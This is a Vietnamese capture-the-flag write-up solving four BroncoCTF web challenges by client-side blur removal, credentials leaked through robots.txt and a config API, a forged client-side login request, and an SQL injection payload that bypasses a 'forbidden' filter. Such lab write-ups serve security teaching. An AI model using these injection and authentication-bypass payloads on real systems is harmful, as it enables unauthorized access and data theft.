# BroncoCTF Web Writeup

![alt text](image-1.png)

## 1. Web - Unblur Me

### Mô tả bài

Challenge cung cấp một trang luyện đạo hàm. Người chơi phải giải đúng 500 câu liên tiếp để xóa hiệu ứng làm mờ ảnh chứa flag. Nếu trả lời sai, số điểm sẽ bị đưa về 0.

Tuy nhiên, toàn bộ cơ chế kiểm tra và làm mờ ảnh đều được xử lý ở phía client bằng JavaScript và CSS.

### Phân tích

Xem source trang web, ta thấy ảnh bí mật được tải ngay khi người dùng mở trang:

```javascript
function loadSecretImage() {
  fetch('/api/v1/internal/fetch-config-blob')
    .then(response => response.blob())
    .then(blob => {
      const blobUrl = URL.createObjectURL(blob);
      const img = document.getElementById('flag-image');
      img.src = blobUrl;
    });
}
```

Ảnh không thực sự bị khóa mà chỉ bị làm mờ bằng CSS:

```css
#flag-image {
  filter: blur(20px);
}
```

Sau khi giải đủ 500 câu, JavaScript chỉ thực hiện thao tác:

```javascript
flag.style.filter = "none";
```

Do đó, ta có thể mở DevTools, chuyển sang tab **Console** và tự xóa hiệu ứng blur:

```javascript
document.getElementById('flag-image').style.filter = 'none';
```

Ngay sau khi chạy lệnh, ảnh chứa flag được hiển thị rõ mà không cần giải 500 câu đạo hàm.

Ngoài ra, cũng có thể truy cập trực tiếp endpoint tải ảnh:

```text
/api/v1/internal/fetch-config-blob
```

Lỗi của challenge là dữ liệu bí mật đã được gửi xuống trình duyệt, còn điều kiện mở khóa chỉ được kiểm tra ở phía client.

**Flag:**

```text
BRONCO{1_WOULDNT_M@K3_YOU_DO_C@LCULUS}
```

---

## 2. Web - Lovely Login

### Mô tả bài

Challenge cung cấp một trang đăng nhập nhưng không công khai tài khoản hoặc mật khẩu. Người chơi cần tìm thông tin bị ẩn trên website để đăng nhập và lấy flag.

### Phân tích

Kiểm tra file `robots.txt`, ta thấy một endpoint bị ẩn cùng một chuỗi Base64:

```text
User-agent: *
Disallow: /security

# amVmZixzYXJhaCx hZG1pbixndWVzdA==
```

Ghép hai phần chuỗi lại:

```text
amVmZixzYXJhaCxhZG1pbixndWVzdA==
```

Sau đó giải mã Base64:

```bash
echo 'amVmZixzYXJhaCxhZG1pbixndWVzdA==' | base64 -d
```

Kết quả:

```text
jeff,sarah,admin,guest
```

Đây là danh sách username có trong hệ thống.

Tiếp tục truy cập endpoint được khai báo trong `robots.txt`:

```text
/security
```

Trang này làm lộ ghi chú nội bộ:

```text
Passwords are derived from usernames
Current implementation stores them backwards for obfuscation
```

Nghĩa là mật khẩu được tạo bằng cách đảo ngược username:

```text
jeff  → ffej
sarah → haras
admin → nimda
guest → tseug
```

Ta sử dụng tài khoản quản trị:

```text
Username: admin
Password: nimda
```

Sau khi đăng nhập thành công, website hiển thị flag.

Challenge tồn tại lỗi **Information Disclosure** do `robots.txt` làm lộ endpoint nhạy cảm và trang `/security` tiết lộ thuật toán tạo mật khẩu.

**Flag:**

```text
bronco{R3v3rs1ng_1s_S3cure}
```

---

## 3. Web - Super Secure Server

### Mô tả bài

Challenge cung cấp một trang đăng nhập thông thường. Người chơi cần tìm username và password để truy cập vào khu vực được bảo vệ.

Tuy nhiên, thông tin đăng nhập lại được website tải trực tiếp xuống trình duyệt thông qua một API cấu hình.

### Phân tích

Xem source JavaScript của trang đăng nhập, ta thấy trình duyệt gửi request tới endpoint:

```javascript
fetch('/api/config')
  .then(res => res.json())
  .then(data => {
    leakedUser = data.username;
    leakedPass = data.password;
  });
```

Truy cập trực tiếp endpoint:

```text
/api/config
```

Server trả về username và password dưới dạng JSON:

```json
{
  "password": "rji32orj932r3209r233sqmet4v2cxbns8",
  "username": "SuperSecretUser"
}
```

Ta sử dụng thông tin này để đăng nhập:

```text
Username: SuperSecretUser
Password: rji32orj932r3209r233sqmet4v2cxbns8
```

Ngoài ra, source còn cho thấy việc xác thực được quyết định bởi dữ liệu do client gửi lên:

```javascript
fetch('/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    authenticated: true
  })
})
```

Do đó, cũng có thể mở Console và gửi trực tiếp request:

```javascript
fetch('/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    authenticated: true
  })
})
.then(res => res.json())
.then(data => {
  window.location.href = data.redirect;
});
```

Sau khi đăng nhập hoặc bypass xác thực thành công, website hiển thị flag.

Challenge tồn tại hai lỗi chính: làm lộ thông tin đăng nhập qua `/api/config` và tin tưởng trạng thái xác thực do phía client cung cấp.

**Flag:**

```text
bronco{d0nt_3xp0se_p@ssw0rd5!}
```

---

## 4. Web - Forbidden Archives

### Mô tả bài

Trang web cho phép tìm kiếm sách thông qua tham số:

```http
GET /?search=<input>
```

Mục tiêu là truy cập cuốn sách bị cấm:

```text
All of the World’s Knowledge
```

Ứng dụng chỉ hiển thị các cuốn sách công khai, trong khi cuốn sách chứa flag bị đánh dấu là `forbidden`.

## Phân tích

Khi nhập payload:

```sql
%' OR 1=1 --
```

Ứng dụng trả về lỗi:

```text
near "1": syntax error
```

Điều này cho thấy dữ liệu từ tham số `search` được đưa vào biểu thức SQL hoặc bộ phân tích cú pháp truy vấn mà không được xử lý an toàn.

Khi thử:

```sql
' OR title LIKE '%World%Knowledge%'-- -
```

server trả về:

```text
near "title": syntax error
```

Có khả năng từ khóa `OR` bị bộ lọc loại bỏ hoặc câu truy vấn có dấu ngoặc khiến payload không còn đúng cú pháp.

Dựa vào cấu trúc trang và payload thành công, truy vấn có thể có dạng:

```sql
SELECT *
FROM books
WHERE (title LIKE '%<search>%')
AND forbidden = 0;
```

Điều kiện:

```sql
AND forbidden = 0
```

chỉ cho phép hiển thị các cuốn sách công khai.

**Payload khai thác**

```sql
Knowledge%')-- -
```

Sau khi được ghép vào câu truy vấn, câu SQL có thể trở thành:

```sql
SELECT *
FROM books
WHERE (title LIKE '%Knowledge%')-- -%')
AND forbidden = 0;
```

Phần:

```sql
Knowledge%
```

làm điều kiện `LIKE` khớp với tên sách:

```text
All of the World’s Knowledge
```

Dấu nháy đơn:

```sql
'
```

đóng chuỗi SQL đang chứa dữ liệu tìm kiếm.

Dấu ngoặc:

```sql
)
```

đóng dấu ngoặc của điều kiện `WHERE`.

Cuối cùng:

```sql
-- -
```

biến phần còn lại của câu truy vấn thành comment.

Do đó, điều kiện bảo mật:

```sql
AND forbidden = 0
```

không còn được thực thi. Ứng dụng vẫn tìm cuốn sách có chữ `Knowledge`, nhưng không còn giới hạn chỉ lấy sách công khai.

**Flag:**

```text
bronco{y0u_d3f3@t3d_th3_h1gh_c0unc1l}
```
